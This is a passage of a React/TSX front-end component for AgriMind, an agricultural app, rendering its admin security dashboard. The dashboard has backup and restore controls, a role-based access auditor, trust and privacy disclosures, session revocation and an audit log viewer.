                  {/* Control triggers */}
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      onClick={() => handleTriggerStorageBackup("incremental")}
                      disabled={isCreatingBackup}
                      className="py-1.5 px-2 bg-slate-900 hover:bg-slate-800 text-white text-[9px] font-black uppercase rounded-lg border border-slate-800 transition-colors cursor-pointer text-center"
                    >
                      {isCreatingBackup ? "Dumping..." : "+ Incremental (pg_dump)"}
                    </button>
                    <button
                      onClick={handleVerifyAndRestoreBackup}
                      disabled={restoreVerificationStatus === "verifying_signature" || restoreVerificationStatus === "verifying_schema"}
                      className="py-1.5 px-2 bg-cyan-600 hover:bg-cyan-700 text-white text-[9px] font-black uppercase rounded-lg transition-colors cursor-pointer text-center flex items-center justify-center gap-1"
                    >
                      <RefreshCw className={`w-3 h-3 ${restoreVerificationStatus === "verifying_signature" || restoreVerificationStatus === "verifying_schema" ? "animate-spin" : ""}`} />
                      <span>Test Restore Sequence</span>
                    </button>
                  </div>

                  {/* Decryption and Restoration Stream Logger */}
                  <div className="p-3 bg-slate-900 text-slate-300 rounded-2xl border border-slate-800 h-28 overflow-y-auto scrollbar-thin space-y-1.5">
                    <div className="flex justify-between items-center">
                      <span className="text-[7px] text-slate-500 font-black block uppercase">Restoration Audit Console Output</span>
                      <span className={`text-[7px] font-black uppercase px-1 rounded ${
                        restoreVerificationStatus === "success" ? "bg-emerald-500/15 text-emerald-400" :
                        restoreVerificationStatus === "verifying_signature" || restoreVerificationStatus === "verifying_schema" ? "bg-cyan-500/15 text-cyan-400" : "bg-slate-800 text-slate-400"
                      }`}>
                        {restoreVerificationStatus === "success" ? "PASSED" : restoreVerificationStatus === "idle" ? "IDLE" : "RUNNING"}
                      </span>
                    </div>

                    <div className="space-y-1 font-mono text-[8px] leading-normal">
                      {restorationLog.length > 0 ? (
                        restorationLog.map((log, idx) => (
                          <div key={idx} className="text-emerald-400">{log}</div>
                        ))
                      ) : (
                        <div className="text-slate-500 italic">No verification trial loaded. Click 'Test Restore Sequence' to start decryption checksum check.</div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* SECTION 6: DATA CLASSIFICATION AND ACCESSIBILITY CHECKER */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                <div className="space-y-1">
                  <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">6. Storage Data Classification & RBAC Policy Auditor Tester</span>
                  <p className="text-[9px] text-slate-400 font-semibold">
                    Ensure secure data isolation complying with regulatory classifications: Public (readable by anyone), Internal (agricultural officers), Confidential (farmer personal fields), and Restricted (credential logs).
                  </p>
                </div>

                {/* Audit Grid Form */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-center">
                  {/* Select Role */}
                  <div className="space-y-1">
                    <label className="text-[8px] font-black uppercase text-slate-400 block">User Access Role</label>
                    <select
                      value={selectedClassRole}
                      onChange={(e: any) => setSelectedClassRole(e.target.value)}
                      className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                    >
                      <option value="farmer">Farmer (External User)</option>
                      <option value="staff">Barangay Staff (Municipal Internal)</option>
                      <option value="admin">Administrator (Root Restricted)</option>
                    </select>
                  </div>

                  {/* Select Resource */}
                  <div className="space-y-1">
                    <label className="text-[8px] font-black uppercase text-slate-400 block">Target Storage Resource</label>
                    <select
                      value={selectedClassResource}
                      onChange={(e) => setSelectedClassResource(e.target.value)}
                      className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                    >
                      <option value="public_weather">PAGASA Weather Cache (`weather_records`) [PUBLIC]</option>
                      <option value="internal_analytics">Aggregate Soil Analytics (`soil_records`) [INTERNAL]</option>
                      <option value="confidential_contact">Farmer Contact Details (`farmers`) [CONFIDENTIAL]</option>
                      <option value="restricted_passwords">Root Hash Registry (`users` passwords) [RESTRICTED]</option>
                    </select>
                  </div>

                  {/* Trigger Audit Button */}
                  <div>
                    <label className="text-[8px] font-black uppercase text-transparent block hidden md:block">Audit Action</label>
                    <button
                      onClick={handleAuditDataClassification}
                      className="w-full py-2 bg-slate-900 hover:bg-slate-800 dark:bg-cyan-600 dark:hover:bg-cyan-700 text-white text-[10px] font-black uppercase rounded-xl transition-all cursor-pointer flex items-center justify-center gap-1.5"
                    >
                      <Lock className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Validate Storage Security Policy</span>
                    </button>
                  </div>
                </div>

                {/* Audit Result Display */}
                {classificationAuditResult && (
                  <div className={`p-4 rounded-2xl border flex items-start gap-4 animate-fade-in ${
                    classificationAuditResult.allowed
                      ? "bg-emerald-50 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-800/40 text-emerald-800 dark:text-emerald-400"
                      : "bg-rose-50 dark:bg-rose-950/20 border-rose-200 dark:border-rose-800/40 text-rose-800 dark:text-rose-400"
                  }`}>
                    {classificationAuditResult.allowed ? (
                      <CheckCircle2 className="w-6 h-6 text-emerald-500 shrink-0" />
                    ) : (
                      <XCircle className="w-6 h-6 text-rose-500 shrink-0" />
                    )}
                    <div className="space-y-1">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-[10px] font-black uppercase tracking-wider">
                          {classificationAuditResult.allowed ? "Access Granted (Policy Verified)" : "Access Denied (Security Violation)"}
                        </span>
                        <span className={`text-[8px] font-black uppercase px-2 py-0.5 rounded-full ${
                          classificationAuditResult.classification === "Public" ? "bg-emerald-500/10 text-emerald-500" :
                          classificationAuditResult.classification === "Internal" ? "bg-blue-500/10 text-blue-500" :
                          classificationAuditResult.classification === "Confidential" ? "bg-amber-500/10 text-amber-500" : "bg-rose-500/10 text-rose-500"
                        }`}>
                          {classificationAuditResult.classification} Data Tier
                        </span>
                      </div>
                      <p className="text-[9px] font-bold leading-normal">
                        {classificationAuditResult.reason}
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAB C: TRUST CENTER & DISCLOSURES */}
          {activeSubTab === "trust" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8">
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <HelpCircle className="w-4 h-4 text-cyan-500" />
                    Sentinel Trust & Governance Framework
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Explore transparency declarations, data origin logs, AI boundaries, and active Terms of Use policies.
                  </p>
                </div>
              </div>

              {/* Accordion Trust Modules */}
              <div className="space-y-4">
                
                {/* Panel 1: Data Governance */}
                <div className="p-5 rounded-2xl border border-slate-100 bg-slate-50/50 dark:bg-slate-950/20 dark:border-white/5 space-y-3">
                  <div className="flex items-center gap-2 border-b border-slate-150 dark:border-white/5 pb-2">
                    <Lock className="w-4 h-4 text-cyan-500" />
                    <h4 className="font-extrabold text-xs text-slate-900 dark:text-white">🔒 How User and Farm Data is Protected</h4>
                  </div>
                  <div className="text-[10px] text-slate-600 dark:text-slate-400 font-semibold leading-relaxed space-y-2">
                    <p>
                      Your agricultural telemetry logs, farm location profiles, and personal RSBSA records are sealed under modern isolation strategies. We enforce:
                    </p>
                    <ul className="list-disc pl-4 space-y-1 font-bold text-slate-700 dark:text-slate-300">
                      <li><span className="text-cyan-500 font-extrabold">Encryption in Transit:</span> All packets are routed using HTTPS with TLS 1.3 encryption.</li>
                      <li><span className="text-cyan-500 font-extrabold">Encryption at Rest:</span> Underlying storage uses AES-256 block-level keys.</li>
                      <li><span className="text-cyan-500 font-extrabold">Data Minimization:</span> Only GPS coordinates needed for weather forecasting are transmitted.</li>
                    </ul>
                  </div>
                </div>

                {/* Panel 2: Sourcing Sincerity */}
                <div className="p-5 rounded-2xl border border-slate-100 bg-slate-50/50 dark:bg-slate-950/20 dark:border-white/5 space-y-3">
                  <div className="flex items-center gap-2 border-b border-slate-150 dark:border-white/5 pb-2">
                    <Database className="w-4 h-4 text-cyan-500" />
                    <h4 className="font-extrabold text-xs text-slate-900 dark:text-white">📊 Weather and Price Feed Origins</h4>
                  </div>
                  <div className="text-[10px] text-slate-600 dark:text-slate-400 font-semibold leading-relaxed space-y-2">
                    <p>
                      AgriMind is designed around verified local and global telemetry indexes:
                    </p>
                    <ul className="list-disc pl-4 space-y-1 font-bold text-slate-700 dark:text-slate-300">
                      <li><span className="text-cyan-500 font-extrabold">Weather Records:</span> Directly synchronized with PAGASA regional bulletins and NOAA satellite imagery interfaces.</li>
                      <li><span className="text-cyan-500 font-extrabold">Crop Index:</span> Scraped from the Department of Agriculture Zambales provincial bulletin board to match real municipal prices.</li>
                    </ul>
                  </div>
                </div>

                {/* Panel 3: AI recommendations */}
                <div className="p-5 rounded-2xl border border-slate-100 bg-slate-50/50 dark:bg-slate-950/20 dark:border-white/5 space-y-3">
                  <div className="flex items-center gap-2 border-b border-slate-150 dark:border-white/5 pb-2">
                    <Radio className="w-4 h-4 text-cyan-500 animate-pulse" />
                    <h4 className="font-extrabold text-xs text-slate-900 dark:text-white">🤖 Generative AI Sourcing & Confidence</h4>
                  </div>
                  <div className="text-[10px] text-slate-600 dark:text-slate-400 font-semibold leading-relaxed space-y-2">
                    <p>
                      Our diagnostic advisor maps issues using Gemini 2.0. To keep outputs accurate and avoid LLM hallucinations:
                    </p>
                    <ul className="list-disc pl-4 space-y-1 font-bold text-slate-700 dark:text-slate-300">
                      <li>AI outputs are separated into <span className="text-emerald-500">Verified Database Facts</span>, <span className="text-cyan-500">Advisory Forecasts</span>, and <span className="text-amber-500">Suggested Steps</span>.</li>
                      <li>Diagnostic confidence indices must exceed <span className="font-extrabold text-white bg-slate-800 px-1.5 py-0.5 rounded font-mono">85%</span> before generating a prescriptive spray path.</li>
                    </ul>
                  </div>
                </div>

                {/* Legal Block: Privacy, Terms & Contact */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-4 rounded-xl border border-slate-200 bg-white dark:bg-slate-900 space-y-2">
                    <span className="text-[8px] font-black uppercase text-slate-400 block">Privacy Notice (Summary)</span>
                    <p className="text-[9px] text-slate-500 font-semibold leading-relaxed">
                      We do not resell agricultural yield coefficients or land details. Users may permanently purge their RSBSA digital twin cache from local and cloud stores at any moment from the dashboard console.
                    </p>
                  </div>
                  <div className="p-4 rounded-xl border border-slate-200 bg-white dark:bg-slate-900 space-y-2">
                    <span className="text-[8px] font-black uppercase text-slate-400 block">Contact Transparency Support</span>
                    <p className="text-[9px] text-slate-500 font-semibold leading-relaxed">
                      For vulnerability reports, API tokens rotation, or audit requests, please reach the Botolan Municipal Trust lead at <span className="font-bold text-cyan-600 dark:text-cyan-400 select-all">security@sammium-agrimind.org</span>.
                    </p>
                  </div>
                </div>

              </div>
            </div>
          )}

          {/* TAB D: ADMIN CONTROL & SECURITY METRICS */}
          {activeSubTab === "admin" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8">
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <Users className="w-4 h-4 text-cyan-500 animate-pulse" />
                    Admin Security Operations Center
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Manage active user sessions, failed authentication audits, system memory, and scheduled disaster backups.
                  </p>
                </div>
              </div>

              {/* Grid: Session list and backup operations */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* Sessions list */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">Active User Sessions Auditing</span>
                  
                  <div className="space-y-3.5">
                    {sessions.map((s) => (
                      <div key={s.id} className="p-3 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-xl flex items-center justify-between">
                        <div className="space-y-1">
                          <div className="flex items-center gap-1.5">
                            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                            <h4 className="font-extrabold text-[11px] text-slate-800 dark:text-white leading-none">{s.device}</h4>
                          </div>
                          <span className="text-[9px] text-slate-500 font-mono block leading-none">{s.ip} • {s.location}</span>
                        </div>
                        <button
                          onClick={() => handleRevokeSession(s.id, s.device)}
                          className="px-2.5 py-1 bg-rose-50 text-rose-700 dark:bg-rose-950/40 dark:text-rose-400 border border-rose-100 dark:border-rose-900/40 text-[8px] font-black uppercase rounded-lg hover:bg-rose-100 cursor-pointer"
                        >
                          Revoke
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Backup & recovery controls */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                  <div className="space-y-3">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">Disaster Recovery Backups Generator</span>
                    
                    <p className="text-[10px] text-slate-500 font-semibold leading-relaxed">
                      Generate compressed database snapshots encrypted using AES-256 GCM block cipher protocols.
                    </p>

                    {isBackingUp && (
                      <div className="p-3.5 bg-slate-950 text-center rounded-xl border border-slate-800">
                        <RefreshCw className="w-5 h-5 mx-auto text-cyan-400 animate-spin mb-1.5" />
                        <span className="text-[9px] font-bold text-cyan-400 animate-pulse">Hashing tables soil_records & user_credentials...</span>
                      </div>
                    )}

                    {backupDownloadUrl && (
                      <div className="p-3 bg-emerald-50 border border-emerald-100 dark:bg-emerald-950/30 dark:border-emerald-900/40 text-emerald-800 dark:text-emerald-400 rounded-xl space-y-2">
                        <span className="text-[9px] font-black uppercase tracking-wider block">SNAPSHOT SUCCESSFUL</span>
                        <div className="flex items-center justify-between">
                          <span className="text-[8px] font-mono font-semibold">agrimind_backup_0707.sql.aes</span>
                          <a 
                            href="#" 
                            onClick={(e) => {
                              e.preventDefault();
                              alert("Simulated download initiated! File: agrimind_backup_0707.sql.aes");
                            }}
                            className="bg-emerald-600 text-white px-2 py-0.5 rounded text-[8px] font-black uppercase flex items-center gap-1 cursor-pointer"
                          >
                            <Download className="w-3 h-3" /> Download
                          </a>
                        </div>
                      </div>
                    )}
                  </div>

                  <button
                    onClick={handleRunBackup}
                    disabled={isBackingUp}
                    className="w-full py-3 bg-slate-900 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase tracking-wider rounded-xl cursor-pointer transition-colors disabled:opacity-50"
                  >
                    Generate AES-256 Database Backup
                  </button>
                </div>

              </div>
            </div>
          )}

        </div>

        {/* Right 1 Column: Live Security Operations Audit Log Stream */}
        <div className="lg:col-span-1 space-y-6">
          <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-6 flex flex-col justify-between min-h-[500px]">
            <div className="space-y-4">
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-500 animate-pulse" />
                  Security Event Logger
                </h3>
                <span className="text-[9px] font-black uppercase bg-emerald-50 text-emerald-700 px-2 py-0.5 rounded dark:bg-emerald-950/40 dark:text-emerald-300">
                  WAF Safe
                </span>
              </div>

              {/* Interactive security metric blocks */}
              <div className="grid grid-cols-2 gap-3.5">
                <div className="p-3 bg-slate-50 dark:bg-slate-950/40 rounded-xl border border-slate-100 dark:border-white/5 space-y-1">
                  <span className="text-[7px] font-black uppercase text-slate-400 tracking-wider">Failed Challenges</span>
                  <div className="flex items-baseline gap-1.5">
                    <span className="text-xl font-black text-slate-800 dark:text-white">1</span>
                    <span className="text-[8px] font-bold text-emerald-600">Past 24h</span>
                  </div>
                </div>
                <div className="p-3 bg-slate-50 dark:bg-slate-950/40 rounded-xl border border-slate-100 dark:border-white/5 space-y-1">
                  <span className="text-[7px] font-black uppercase text-slate-400 tracking-wider">Threats Defeated</span>
                  <div className="flex items-baseline gap-1.5">
                    <span className="text-xl font-black text-rose-600">14</span>
                    <span className="text-[8px] font-bold text-rose-500 animate-pulse">WAF Intercept</span>
                  </div>
                </div>
              </div>

              {/* Logs Stream */}
              <div className="space-y-2">
                <span className="text-[10px] font-black uppercase text-slate-400 block tracking-wider">Real-time Cryptographic Audit Log</span>
                
                <div className="bg-slate-950 p-4 rounded-xl font-mono text-[9px] h-[340px] overflow-y-auto space-y-3.5 border border-slate-800 scrollbar-thin">
                  {auditLogs.map((log) => (
                    <div key={log.id} className="space-y-1 leading-normal border-b border-slate-900 pb-2.5 last:border-0 last:pb-0">
                      <div className="flex items-center justify-between">
                        <span className={`font-black text-[8px] uppercase px-1.5 py-0.2 rounded ${
                          log.severity === "critical" 
                            ? "bg-rose-950 text-rose-400 border border-rose-900/35" 
                            : log.severity === "warning" 
                            ? "bg-amber-950 text-amber-400 border border-amber-900/35" 
                            : "bg-slate-900 text-cyan-400 border border-slate-800"
                        }`}>{log.event}</span>
                        <span className="text-[8px] text-slate-500">{log.timestamp}</span>
                      </div>
                      <p className="text-slate-300 font-semibold">{log.details}</p>
                      <div className="flex justify-between text-[7px] text-slate-500">
                        <span>Source: {log.source}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div className="text-[9px] text-slate-400 leading-normal pt-4 border-t border-slate-100 dark:border-white/5">
              🛡️ All records cryptographically signed and stored in immutable ledger logs.
            </div>
          </div>
        </div>

      </div>

    </div>
  );
}
